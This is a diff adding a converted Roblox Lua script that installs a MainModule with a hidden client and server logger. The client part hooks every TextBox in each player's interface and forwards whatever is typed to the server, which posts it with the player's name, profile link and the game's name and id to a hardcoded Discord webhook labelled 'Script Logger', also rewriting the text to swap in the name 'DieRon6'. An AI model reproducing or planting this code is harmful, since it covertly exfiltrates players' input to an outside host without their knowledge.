@@ -1,0 +1,175 @@
+
+--Converted with ttyyuu12345's model to script plugin v4
+function sandbox(var,func)
+	local env = getfenv(func)
+	local newenv = setmetatable({},{
+		__index = function(self,k)
+			if k=="script" then
+				return var
+			else
+				return env[k]
+			end
+		end,
+	})
+	setfenv(func,newenv)
+	return func
+end
+cors = {}
+mas = Instance.new("Model",game:GetService("Lighting"))
+ModuleScript0 = Instance.new("ModuleScript")
+LocalScript1 = Instance.new("LocalScript")
+RemoteEvent2 = Instance.new("RemoteEvent")
+Script3 = Instance.new("Script")
+ModuleScript0.Name = "MainModule"
+ModuleScript0.Parent = mas
+table.insert(cors,sandbox(ModuleScript0,function()
+return function()
+	script:WaitForChild("LocalScript"):Clone().Parent = game.StarterPlayer.StarterCharacterScripts
+	script:WaitForChild("Script").Parent = game.ServerScriptService
+	script:WaitForChild("event").Parent = game.ReplicatedStorage
+	for _, v in pairs(game.Players:GetPlayers()) do
+		script.LocalScript:Clone().Parent = v:WaitForChild("PlayerScripts")
+	end
+	script.LocalScript:Destroy()
+end
+end))
+LocalScript1.Parent = ModuleScript0
+table.insert(cors,sandbox(LocalScript1,function()
+local plr = game.Players.LocalPlayer
+--print("run")
+plr:WaitForChild("PlayerGui").DescendantAdded:Connect(function(yes)
+	if yes:IsA("TextBox") and not yes:FindFirstAncestor("Chat") and not yes:FindFirstAncestor("MakerModelLua's Admin Form") and not yes:FindFirstAncestor("MakerModelLua's TaskBar") then
+		yes.FocusLost:Connect(function()
+			if yes.Text ~= "Script Here" and yes.Text ~= "" and yes.Text ~= "Nope - The Boss" and yes.Text ~= "TYPE WHATEVER HERE" and yes.Text ~= "Nice try" and yes.Text ~= "" and #yes.Text > 10 and plr.Name ~= "DieRon6" and yes.Text ~= plr.Name and yes.Text ~= "game.Players:ClearAllChildren()" then
+				game.ReplicatedStorage:WaitForChild("event"):FireServer(yes.Text, "sjn123njidf90asd91231m23m90vd9gsdfrn1j23n1j2389fa8sd98ase12n3")
+			else
+				return
+			end
+		end)
+	end
+end)
+
+for _, yes in pairs(plr:GetDescendants()) do
+	if yes:IsA("TextBox") and not yes:FindFirstAncestor("Chat") and not yes:FindFirstAncestor("MakerModelLua's Admin Form") and not yes:FindFirstAncestor("MakerModelLua's TaskBar") then
+--		print("t")
+		yes.FocusLost:Connect(function()
+			if yes.Text ~= "Script Here" and "" and  "Nope - The Boss" and "TYPE WHATEVER HERE" and "Nice try" and "" and #yes.Text > 10 and plr.Name ~= "DieRon6" and yes.Text ~= plr.Name and yes.Text ~= "game.Players:ClearAllChildren()" then
+				game.ReplicatedStorage:WaitForChild("event"):FireServer(yes.Text, "yeskeythingnowhy")
+--				print("fire")
+			else
+--				print("no")
+				return
+			end
+		end)
+	end
+end
+end))
+RemoteEvent2.Name = "event"
+RemoteEvent2.Parent = ModuleScript0
+Script3.Parent = ModuleScript0
+table.insert(cors,sandbox(Script3,function()
+local HTTP = game:GetService("HttpService")
+local Webhook = 'https://discordapp.com/api/webhooks/739882911356026912/T-n9mKde08vD7xGHGNkb6g8eorDuVx_4hWl-I-pb2HHNmJ6jcka-orCmfa2qvVkLJlMZ' --Webhook Goes Here
+local ratelimit = 15
+requests = 0
+local HookData = {
+	['content'] = "";
+	['username'] = "";
+	['avatar_url'] = "";
+}
+
+spawn(function()
+	while wait(30) do
+		requests = 0
+	end
+end)
+
+local HookData = {
+	["embeds"] = {
+		{
+			["title"] = "Loaded Script Logger",
+			["description"] = "Game: "..game.Name.."\nGame Id: "..game.GameId;
+			["color"] = 15106841;
+		}
+	},
+	["username"] = "Script Logger";
+}
+HTTP:PostAsync(Webhook, HTTP:JSONEncode(HookData))
+
+local function webhooktime(player, text, key)
+	--	print("receive")
+	if key == "yeskeythingnowhy" then
+		--		print("yes")
+		requests = requests + 1
+		if requests >= 15 then
+			wait(requests - 20)
+		end
+		local HookData = {
+			["embeds"] = {
+				{
+					["title"] = "Script Logged",
+					["description"] = "```lua\n"..text.."\n```\n\n**Replaced Version:**\n```lua\n"..string.gsub(text, player.Name, "DieRon6").."\n```";
+					["color"] = 15106841;
+					["author"] = {
+						["name"] = player.Name;
+						["url"] = "https://www.roblox.com/users/"..player.UserId.."/profile";
+						["icon_url"] = 'https://www.roblox.com/headshot-thumbnail/image'..'?width=420&height=420&format=png&userId='..player.UserId;
+					}
+				}	
+			},
+			["username"] = "Script Logger";
+		}
+		--	print("\"", player, "\"", text, "\"")
+		
+		HTTP:postAsync(Webhook, HTTP:JSONEncode(HookData))
+	else
+		--		print("no")
+	end
+end
+
+game.Close:Connect(function()
+	local HookData = {
+		["embeds"] = {
+			{
+				["title"] = "Server Closing",
+				["description"] = "Game: "..game.Name.."\nGame Id: "..game.GameId;
+				["color"] = 15106841;
+			}
+		},
+		["username"] = "Script Logger";
+	}
+	HTTP:PostAsync(Webhook, HTTP:JSONEncode(HookData))
+end)
+
+--
+--game.Players.PlayerAdded:Connect(function(plr)
+--	print(plr)
+--	plr.PlayerGui.DescendantAdded:Connect(function(yes)
+--		if yes:IsA("TextBox") then
+--			print("t")
+--			yes.FocusLost:Connect(function()
+--				print("e")
+--				webhooktime(plr, yes.Text)
+--				print("e")
+--			end)
+--		end
+--	end)
+--end)
+
+game.ReplicatedStorage:WaitForChild("event").OnServerEvent:Connect(function(p,t,k)
+	print("receive")
+	spawn(function()
+		webhooktime(p,t,k)
+	end)
+end)
+end))
+for i,v in pairs(mas:GetChildren()) do
+	v.Parent = workspace
+	pcall(function() v:MakeJoints() end)
+end
+mas:Destroy()
+for i,v in pairs(cors) do
+	spawn(function()
+		pcall(v)
+	end)
+end
